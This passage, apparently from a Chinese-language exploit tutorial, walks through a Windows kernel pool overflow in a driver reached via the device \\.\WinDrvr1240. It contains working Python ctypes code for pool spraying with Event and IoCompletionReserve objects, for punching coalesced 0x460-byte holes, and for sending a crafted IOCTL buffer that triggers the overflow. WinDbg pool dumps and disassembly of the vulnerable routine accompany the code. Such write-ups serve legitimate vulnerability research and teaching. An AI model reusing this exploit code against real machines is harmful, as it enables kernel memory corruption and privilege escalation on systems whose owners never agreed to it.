        Spray the Kernel Pool with IoCompletionReserve and Event Objects.
        The IoCompletionReserve object is 0x60 and Event object is 0x40 bytes in length.
        These are allocated from the Nonpaged kernel pool.
        """
        handles = []
        IO_COMPLETION_OBJECT = 1
        for i in range(0, 25000):
            handles.append(windll.kernel32.CreateEventA(0,0,0,0))
            hHandle = HANDLE(0)
            handles.append(ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, IO_COMPLETION_OBJECT))
        # could do with some better validation
        if len(handles) > 0:
            return True
        return False
这个函数可以喷出50000个对象，其中包括25000个Event对象和25000个IoCompletionReserve对象。在WinDBG中，看起来非常炫酷：
    kd> !pool 85d1f000
    Pool page 85d1f000 region is Nonpaged pool
    *85d1f000 size:   60 previous size:    0  (Allocated) *IoCo (Protected)
            Owning component : Unknown (update pooltag.txt)
     85d1f060 size:   60 previous size:   60  (Allocated)  IoCo (Protected)       >> "0x%x" % (0x7 * 0xa0)
    '0x460'
    >>>
此时，会产生我们所希望的大小。让我们迅速来看看如果我们只释放接下来的7个IoCompletionReserve对象后会怎么样：
    kd> !pool 85d1f000
    Pool page 85d1f000 region is Nonpaged pool
    *85d1f000 size:   60 previous size:    0  (Allocated) *IoCo (Protected)
            Owning component : Unknown (update pooltag.txt)
     85d1f060 size:   60 previous size:   60  (Free)       IoCo
     85d1f0c0 size:   40 previous size:   60  (Allocated)  Even (Protected)
     85d1f100 size:   60 previous size:   40  (Free)       IoCo
     85d1f160 size:   40 previous size:   60  (Allocated)  Even (Protected)
    ......
     85d1f420 size:   60 previous size:   40  (Free)       IoCo
     85d1f480 size:   40 previous size:   60  (Allocated)  Even (Protected)
     85d1f4c0 size:   60 previous size:   40  (Allocated)  IoCo (Protected)
     85d1f520  size:      40  previous size:       60    (Allocated)    Even  (Protected)
    ......
     85d1ff60 size:   60 previous size:   40  (Allocated)  IoCo (Protected)
     85d1ffc0 size:   40 previous size:   60  (Allocated)  Even (Protected)
可以看出，我们已经拥有很多已被释放的块，但它们是各自独立的。但是，我们仍需要把它们合并成一个0x460的区块。我们首先将区块的偏移量设置为0x60（第一个指向0xXXXXY060）。
                bin = []
                # object sizes
                CreateEvent_size         = 0x40
                IoCompletionReserve_size = 0x60
                combined_size            = CreateEvent_size + IoCompletionReserve_size
                # after the 0x20 chunk hole, the first object will be the IoCompletionReserve object
                offset = IoCompletionReserve_size  
                for i in range(offset, offset + (7 * combined_size), combined_size):
                    try:
                        # chunks need to be next to each other for the coalesce to take effect
                        bin.append(khandlesd[obj + i])
                        bin.append(khandlesd[obj + i - IoCompletionReserve_size])
                    except KeyError:
                        pass
                # make sure it's contiguously allocated memory
                if len(tuple(bin)) == 14:
                    holes.append(tuple(bin))
        # make the holes to fill
        for hole in holes:
            for handle in hole:
                kernel32.CloseHandle(handle)
在我们释放函数的同时，在池中打洞，并获得我们所期待的释放块。
    kd> !pool 8674e000
    Pool page 8674e000 region is Nonpaged pool
    *8674e000 size:  460 previous size:    0  (Free)      *Io                       <-- 0x460 chunk is free
        Pooltag Io   : general IO allocations, Binary : nt!io
     8674e460 size:   60 previous size:  460  (Allocated)  IoCo (Protected)
     8674e4c0 size:   40 previous size:   60  (Allocated)  Even (Protected)
    ......
     8674ef60 size:   40 previous size:   60  (Allocated)  Even (Protected)
     8674efa0 size:   60 previous size:   40  (Allocated)  IoCo (Protected)
在此时，释放的区块已经合并，并且拥有一个完美的大小，接下来就可以进行分配和覆盖。
**对已释放区块的分配和覆盖**
****
    def we_can_trigger_the_pool_overflow():
        """
        This triggers the pool overflow vulnerability using a buffer of size 0x460.
        """
        GENERIC_READ  = 0x80000000
        GENERIC_WRITE = 0x40000000
        OPEN_EXISTING = 0x3
        DEVICE_NAME   = "\\.\WinDrvr1240"
        dwReturn      = c_ulong()
        driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
        inputbuffer       = 0x41414141
        inputbuffer_size  = 0x5000
        outputbuffer_size = 0x5000
        outputbuffer      = 0x20000000
        alloc_pool_overflow_buffer(inputbuffer, inputbuffer_size)
        IoStatusBlock = c_ulong()
        if driver_handle:
            dev_ioctl = ntdll.ZwDeviceIoControlFile(driver_handle, None, None, None, byref(IoStatusBlock), 0x953824b7,
                                                    inputbuffer, inputbuffer_size, outputbuffer, outputbuffer_size)
            return True
        return False
**实现溢出**
****
大家可能注意到，在对缓冲区中偏移0x90的利用中，有一个空的dword。
    def alloc_pool_overflow_buffer(base, input_size):
        """
        Craft our special buffer to trigger the overflow.
        """
        print "(+) allocating pool overflow input buffer"
        baseadd   = c_int(base)
        size = c_int(input_size)
        input  = "x41" * 0x18                     # offset to size
        input += struct.pack("<I", 0x0000008d)     # controlled size (this triggers the overflow)
        input += "x42" * (0x90-len(input))        # padding to survive bsod
        input += struct.pack("<I", 0x00000000)     # use a NULL dword for sub_4196CA
        input += "x43" * ((0x460-0x8)-len(input)) # fill our pool buffer
该溢出需要始终存在，并且不能再被处理。下列的代码可以在复制循环后直接执行：
    .text:004199ED loc_4199ED:                                  ; CODE XREF: sub_41998E+41
    .text:004199ED                 push    9
    .text:004199EF                 pop     ecx
    .text:004199F0                 lea     eax, [ebx+90h]       ; controlled from the copy
    .text:004199F6                 push    eax                  ; void *
    .text:004199F7                 lea     esi, [edx+6Ch]       ; controlled offset
    .text:004199FA                 lea     eax, [edx+90h]       ; controlled offset
    .text:00419A00                 lea     edi, [ebx+6Ch]       ; controlled from copy
    .text:00419A03                 rep movsd
    .text:00419A05                 push    eax                  ; int
    .text:00419A06                 call    sub_4196CA           ; call sub_4196CA
值得注意的是，代码将会调用sub_4196CA。此外还要注意，@eax会成为我们的缓冲区+0x90（0x004199FA）。我们具体看一下这个函数调用：
    .text:004196CA sub_4196CA      proc near                    ; CODE XREF: sub_4195A6+1E